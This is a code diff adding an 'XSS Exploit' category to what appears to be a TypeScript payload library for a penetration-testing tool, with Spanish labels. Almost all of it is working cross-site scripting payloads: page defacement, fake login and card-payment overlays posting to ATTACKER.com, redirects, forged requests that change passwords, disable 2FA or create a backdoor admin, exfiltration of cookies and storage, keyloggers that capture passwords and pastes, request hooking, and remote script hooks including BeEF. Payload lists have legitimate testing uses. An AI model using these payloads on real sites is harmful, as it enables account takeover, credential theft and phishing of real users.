@@ -1503,6 +1503,102 @@ export const sqlTruncation: PayloadCategory = {
   ],
 }
 
+export const xssExploit: PayloadCategory = {
+  title: "XSS Exploit — DOM / Defacement / Actions",
+  description: "Payloads de explotación real: defacement, UI injection, redirección, CSRF via XSS, exfiltración, keylogging, control de flujo y persistencia (Stored XSS)",
+  tag: "XSS Exploit",
+  tagColor: "bg-red-500/10 text-red-400 border-red-500/20",
+  payloads: [
+    // ── 1. DOM Manipulation / Defacement ──────────────────────────────────────
+    "/* 🧱 1. DOM / DEFACEMENT — cambiar lo que el usuario ve */",
+    "document.body.innerHTML='<h1 style=\"color:red;text-align:center;margin-top:20vh;font-size:4rem\">Hacked</h1>'",
+    "document.body.innerHTML='<h1>Hacked by XSS</h1><p>Your site has been compromised.</p>'",
+    "document.title='HACKED'",
+    "document.querySelector('h1').innerText='HACKED'",
+    "document.querySelectorAll('p,h1,h2,h3,span,a').forEach(e=>e.innerText='HACKED')",
+    "document.body.style.cssText='background:#000!important;color:red!important;filter:invert(1)'",
+    "document.body.style.background='url(https://ATTACKER.com/defaced.jpg) no-repeat center/cover'",
+    "document.getElementById('content').remove()",
+    "document.querySelectorAll('img').forEach(i=>i.src='https://ATTACKER.com/hacked.png')",
+    "document.querySelectorAll('a').forEach(a=>a.href='https://ATTACKER.com')",
+    "<script>document.body.outerHTML='<body style=background:red><h1>Defaced</h1></body>'</script>",
+
+    // ── 2. UI Injection / Phishing in-site ───────────────────────────────────
+    "/* 🧩 2. UI INJECTION — agregar contenido falso a la página */",
+    "var d=document.createElement('div');d.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99999;display:flex;align-items:center;justify-content:center';d.innerHTML='<div style=\"text-align:center\"><h2>Session expired</h2><form action=\"https://ATTACKER.com/steal\" method=\"POST\"><input name=\"user\" placeholder=\"Username\" style=\"display:block;margin:8px auto;padding:8px;width:250px\"><input type=\"password\" name=\"pass\" placeholder=\"Password\" style=\"display:block;margin:8px auto;padding:8px;width:250px\"><button style=\"padding:10px 30px;background:#0066cc;color:#fff;border:0;cursor:pointer\">Sign In</button></form></div>';document.body.appendChild(d)",
+    "var b=document.createElement('button');b.innerText='Verify Account';b.style.cssText='position:fixed;bottom:20px;right:20px;z-index:9999;background:red;color:#fff;padding:12px 20px;border:0;border-radius:6px;cursor:pointer;font-size:16px';b.onclick=()=>location.href='https://ATTACKER.com/phish';document.body.appendChild(b)",
+    "var m=document.createElement('div');m.style.cssText='position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#d32f2f;color:#fff;padding:14px 28px;border-radius:8px;z-index:99999;font-size:15px';m.innerText='⚠️ Your account has been flagged. Click here to verify.';m.onclick=()=>location.href='https://ATTACKER.com';document.body.appendChild(m)",
+    "var f=document.createElement('form');f.action='https://ATTACKER.com/steal';f.method='POST';f.innerHTML='<input name=\"cc\" placeholder=\"Card number\"><input name=\"exp\" placeholder=\"MM/YY\"><input name=\"cvv\" placeholder=\"CVV\"><button>Pay Now</button>';document.querySelector('form')?.replaceWith(f)",
+
+    // ── 3. Redirección ───────────────────────────────────────────────────────
+    "/* 🔁 3. REDIRECCIÓN — mover al usuario a otra página */",
+    "window.location='https://ATTACKER.com'",
+    "window.location.href='https://ATTACKER.com/fake-login'",
+    "location.replace('https://ATTACKER.com')",
+    "window.location.assign('https://ATTACKER.com')",
+    "setTimeout(()=>location.href='https://ATTACKER.com',3000)",
+    "window.open('https://ATTACKER.com','_blank')",
+    "history.pushState({},'','https://ATTACKER.com')",
+    "document.location='javascript:window.location=\"https://ATTACKER.com\"'",
+
+    // ── 4. Acciones como el usuario (CSRF via XSS) ────────────────────────────
+    "/* ⚙️ 4. ACCIONES COMO USUARIO — CSRF via XSS */",
+    "fetch('/api/change-password',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({newPassword:'hacked123'}),credentials:'include'})",
+    "fetch('/api/change-email',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'attacker@evil.com'}),credentials:'include'})",
+    "fetch('/account/delete',{method:'POST',credentials:'include'})",
+    "fetch('/api/transfer',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({to:'attacker',amount:9999}),credentials:'include'})",
+    "var f=document.createElement('form');f.method='POST';f.action='/admin/create-user';f.innerHTML='<input name=\"username\" value=\"backdoor\"><input name=\"password\" value=\"P@ssw0rd\"><input name=\"role\" value=\"admin\">';document.body.appendChild(f);f.submit()",
+    "fetch('/api/user/settings',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({2fa_enabled:false}),credentials:'include'})",
+    "document.forms[0].action='https://ATTACKER.com/steal';document.forms[0].submit()",
+
+    // ── 5. Exfiltración / Requests externos ───────────────────────────────────
+    "/* 📡 5. EXFILTRACIÓN — enviar datos hacia afuera */",
+    "fetch('https://ATTACKER.com/?c='+document.cookie)",
+    "new Image().src='https://ATTACKER.com/?c='+encodeURIComponent(document.cookie)",
+    "navigator.sendBeacon('https://ATTACKER.com/collect',document.cookie)",
+    "fetch('https://ATTACKER.com/?ls='+btoa(JSON.stringify({...localStorage})))",
+    "fetch('https://ATTACKER.com/?ss='+btoa(JSON.stringify({...sessionStorage})))",
+    "fetch('https://ATTACKER.com/?dom='+btoa(document.body.innerHTML.substring(0,2000)))",
+    "fetch('https://ATTACKER.com/?url='+encodeURIComponent(location.href)+'&ref='+encodeURIComponent(document.referrer))",
+    "fetch('https://ATTACKER.com/?ua='+encodeURIComponent(navigator.userAgent)+'&lang='+navigator.language)",
+    "fetch('/api/userinfo',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://ATTACKER.com/?d='+btoa(JSON.stringify(d))))",
+    "var x=new XMLHttpRequest();x.open('GET','https://ATTACKER.com/?c='+document.cookie);x.send()",
+    "document.write('<img src=\"https://ATTACKER.com/?c='+document.cookie+'\">')",
+
+    // ── 6. Keylogging ─────────────────────────────────────────────────────────
+    "/* ⌨️ 6. KEYLOGGING — capturar lo que escribe el usuario */",
+    "document.addEventListener('keypress',e=>fetch('https://ATTACKER.com/?k='+encodeURIComponent(e.key)))",
+    "var buf='';document.addEventListener('keydown',e=>{buf+=e.key;if(buf.length>20){fetch('https://ATTACKER.com/?keys='+encodeURIComponent(buf));buf=''}})",
+    "document.querySelectorAll('input,textarea').forEach(i=>i.addEventListener('input',e=>fetch('https://ATTACKER.com/?f='+encodeURIComponent(e.target.name||e.target.id)+'&v='+encodeURIComponent(e.target.value))))",
+    "document.querySelectorAll('input[type=password]').forEach(i=>i.addEventListener('change',e=>fetch('https://ATTACKER.com/?pass='+encodeURIComponent(e.target.value))))",
+    "document.addEventListener('paste',e=>fetch('https://ATTACKER.com/?paste='+encodeURIComponent((e.clipboardData||window.clipboardData).getData('text'))))",
+    "var orig=HTMLFormElement.prototype.submit;HTMLFormElement.prototype.submit=function(){fetch('https://ATTACKER.com/?form='+encodeURIComponent(new URLSearchParams(new FormData(this)).toString()));orig.call(this)}",
+
+    // ── 7. Control del flujo ──────────────────────────────────────────────────
+    "/* 🧠 7. CONTROL DE FLUJO — manipular comportamiento del sitio */",
+    "document.querySelectorAll('button,input[type=submit],a').forEach(b=>b.disabled=true)",
+    "window.onbeforeunload=()=>''",
+    "setInterval(()=>document.querySelectorAll('button').forEach(b=>b.disabled=true),100)",
+    "var orig=window.fetch;window.fetch=function(u,o){fetch('https://ATTACKER.com/?intercept='+encodeURIComponent(u));return orig.apply(this,arguments)}",
+    "var origXHR=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){fetch('https://ATTACKER.com/?xhr='+encodeURIComponent(u));return origXHR.apply(this,arguments)}",
+    "history.pushState=function(){};history.replaceState=function(){}",
+    "window.confirm=()=>true;window.alert=()=>{}",
+    "document.querySelectorAll('a[href]').forEach(a=>a.addEventListener('click',e=>{e.preventDefault();fetch('https://ATTACKER.com/?click='+a.href)}))",
+    "Object.defineProperty(document,'cookie',{get:()=>'',set:v=>fetch('https://ATTACKER.com/?setCookie='+encodeURIComponent(v))})",
+
+    // ── 8. Persistencia (Stored XSS) ─────────────────────────────────────────
+    "/* 🧬 8. PERSISTENCIA — stored XSS que se ejecuta para todos */",
+    "localStorage.setItem('__xss','<img src=x onerror=eval(atob(\"'+btoa('fetch(\"https://ATTACKER.com/?c=\"+document.cookie)')+'\"))>')",
+    "document.cookie='__session=<img src=x onerror=alert(1)>;path=/;SameSite=None'",
+    "var s=document.createElement('script');s.src='https://ATTACKER.com/hook.js';document.head.appendChild(s)",
+    "if(!window.__hooked){window.__hooked=1;var s=document.createElement('script');s.src='https://ATTACKER.com/persistent.js';document.head.appendChild(s)}",
+    "navigator.serviceWorker.register('/sw.js').catch(()=>{})",
+    "caches.open('xss').then(c=>c.add('/critical-page'))",
+    "indexedDB.open('xss').onsuccess=e=>e.target.result.transaction(['store'],'readwrite').objectStore('store').put({payload:'<script>alert(1)<\\/script>'},'key')",
+    "/* BeEF hook (usar con BeEF framework): */ var s=document.createElement('script');s.src='http://ATTACKER.com:3000/hook.js';document.head.appendChild(s)",
+  ],
+}
+
 export const allPayloadCategories: PayloadCategory[] = [
   sqliClassic,
   sqliUnionBased,
@@ -1544,4 +1640,5 @@ export const allPayloadCategories: PayloadCategory[] = [
   httpParameterPollution,
   cachePoisoning,
   sqlTruncation,
+  xssExploit,
 ]
